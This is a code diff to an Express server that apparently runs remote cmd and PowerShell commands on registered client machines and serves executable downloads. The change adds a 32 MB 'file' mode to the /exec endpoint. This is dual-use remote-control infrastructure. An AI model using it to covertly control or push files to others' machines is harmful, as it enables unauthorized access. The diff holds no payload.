@@ -94,7 +94,15 @@ app.use('/api/client/upload', express.raw({
   limit: CFG.maxUpload,
 }));
 
-app.use(express.json({ limit: '256kb' }));
+// file manager uploads go through /exec — larger body than the global 256kb limit
+const jsonSmall = express.json({ limit: '256kb' });
+const jsonExec  = express.json({ limit: '32mb' });
+app.use((req, res, next) => {
+  if (req.method === 'POST' && /^\/api\/clients\/\d+\/exec\/?$/.test(req.path)) {
+    return jsonExec(req, res, next);
+  }
+  return jsonSmall(req, res, next);
+});
 
 const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
 const limitGlobal = limit({
@@ -386,8 +394,10 @@ app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
 app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const { shell, line } = req.body || {};
-  if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
-  if (typeof line !== 'string' || !line.trim() || line.length > 8192)
+  if (!['cmd', 'powershell', 'file'].includes(shell))
+    return res.status(400).json({ error: 'bad shell' });
+  const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 8192;
+  if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
     return res.status(400).json({ error: 'bad line' });
 
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
@@ -649,7 +659,7 @@ const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin'];
 
 const limitDownloadExe = rateLimit({
   windowMs: 60 * 60 * 1000,
-  max: 100, // increased from 30 to avoid wiping a whole fleet hitting rate limits
+  max: 100,
   standardHeaders: true,
   legacyHeaders: false,
   message: { error: 'download limit reached' },
